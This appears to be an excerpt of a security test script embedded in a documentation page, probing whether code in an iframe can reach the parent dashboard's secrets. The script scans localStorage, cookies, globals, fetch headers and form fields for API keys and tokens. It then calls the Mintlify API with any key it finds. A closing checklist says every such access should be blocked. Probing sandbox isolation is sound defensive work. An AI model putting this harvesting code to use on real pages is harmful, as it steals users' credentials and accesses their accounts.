...
<script>
  {`
console.log('🔑 API KEY & DASHBOARD ACCESS TEST STARTED');
...
commonApiKeyLocations.forEach(keyName => {
  try {
    ...
    if (value) {
      console.log(\`🎯 FOUND POTENTIAL API KEY IN LOCALSTORAGE: \${keyName} = \${value}\`);
    }
  } catch (e) {
    console.log(\`❌ \${keyName} access blocked:\`, e.message);
  }
});
  ...
  if (window.parent && window.parent.localStorage) {
    commonApiKeyLocations.forEach(keyName => {
      try {
        ...
        if (value) {
          console.log(\`🚨 CRITICAL: DASHBOARD API KEY EXTRACTED FROM PARENT: \${keyName} = \${value}\`);
        }
      } catch (e) {
        console.log(\`❌ Parent \${keyName} blocked:\`, e.message);
      }
    });
    ...
    for (let i = 0; i < window.parent.localStorage.length; i++) {
      ...
      if (key && value) {
        ...
        if (/api|key|token|auth|secret|mintlify/i.test(key)) {
          console.log(\`🎯 SUSPICIOUS KEY FOUND: \${key} = \${value.substring(0, 20)}...\`);
        }
        ...
        if (/^sk-[a-zA-Z0-9]{32,}/.test(value) || // OpenAI-style keys
          ...
          console.log(\`🚨 POTENTIAL API KEY PATTERN DETECTED: \${key} = \${value}\`);
        }
      }
    }
  }
} catch (e) {
  console.log('❌ Parent localStorage completely blocked:', e.message);
}
  ...
  if (document.cookie) {
    ...
    cookies.forEach(cookie => {
      ...
      if (name && value && /api|key|token|auth|mintlify/i.test(name)) {
        console.log(\`🎯 API-related cookie found: \${name} = \${value}\`);
      }
    });
  }
  ...
  if (window.parent && window.parent.document) {
    ...
    if (window.parent.document.cookie) {
      ...
      parentCookies.forEach(cookie => {
        const [name, value] = cookie.trim().split('=');
        if (name && value && /api|key|token|auth|mintlify/i.test(name)) {
          console.log(\`🚨 DASHBOARD API COOKIE: \${name} = \${value}\`);
        }
      });
    }
  }
} catch (e) {
  console.log('❌ Cookie extraction blocked:', e.message);
}
...
globalVarNames.forEach(varName => {
  try {
    ...
    if (value) {
      console.log(\`🎯 Global variable found: \${varName} =\`, value);
    }
  } catch (e) {
...
try {
  if (window.parent) {
    globalVarNames.forEach(varName => {
      try {
        ...
        if (value) {
          console.log(\`🚨 PARENT GLOBAL API DATA: \${varName} =\`, value);
        }
      } catch (e) {
  ...
  console.log('❌ Parent globals blocked:', e.message);
}
...
try {
  ...
  if (window.parent && window.parent.React) {
    console.log('🎯 React detected in parent window');
  }
  
  // Check for Vue DevTools  
  if (window.parent && window.parent.Vue) {
    console.log('🎯 Vue detected in parent window');
  }
  
  // Check for common state management
  if (window.parent && window.parent.__REDUX_STORE__) {
    console.log('🎯 Redux store found in parent');
  }
  
  if (window.parent && window.parent.$store) {
    console.log('🎯 Vuex store found in parent');
  }
} catch (e) {
  console.log('❌ App state access blocked:', e.message);
}
...
try {
    ...
    if (args[1] && args[1].headers) {
      Object.entries(args[1].headers).forEach(([key, value]) => {
        if (/authorization|api-key|x-api-key/i.test(key)) {
          console.log(\`🚨 API KEY IN FETCH HEADERS: \${key} = \${value}\`);
        }
      });
    }
  ...
  console.log('❌ Fetch interception blocked:', e.message);
}
    ...
    parentForms.forEach((form, index) => {
      ...
      inputs.forEach(input => {
        if (/api|key|token|password/i.test(input.name) || /api|key|token|password/i.test(input.id)) {
          console.log(\`🚨 SENSITIVE FORM FIELD IN PARENT: \${input.name || input.id} = \${input.value}\`);
        }
      });
    });
  }
} catch (e) {
  console.log('❌ Parent form access blocked:', e.message);
}
...
try {
  ...
  if (testApiKey) {
    console.log('🚨 ATTEMPTING MINTLIFY API CALL WITH EXTRACTED KEY');
    ...
    fetch('https://api.mintlify.com/v1/projects', {
      ...
      console.log('🚨 MINTLIFY API RESPONSE STATUS:', response.status);
      if (response.ok) {
        response.json().then(data => {
          console.log('🚨 MINTLIFY API DATA ACCESSED:', data);
        });
      }
    }).catch(e => {
      console.log('❌ Mintlify API call failed:', e.message);
    });
  } else {
    console.log('No Mintlify API key found for testing');
  }
} catch (e) {
  console.log('❌ API access attempt blocked:', e.message);
}

// Visual indicator with severity
const indicator = document.createElement('div');
indicator.innerHTML = '🔑 CRITICAL: API KEY ACCESS TEST ACTIVE';
...
setTimeout(() => {
  indicator.remove();
  style.remove();
  console.log('🔑 API KEY & DASHBOARD ACCESS TEST COMPLETED');
...
- ❌ All parent localStorage access should be **BLOCKED**
- ❌ Parent cookie access should be **BLOCKED**
- ❌ Parent global variables should be **INACCESSIBLE**
- ❌ Network interception should be **LIMITED** to iframe scope
- ❌ No API keys should be **EXTRACTABLE**
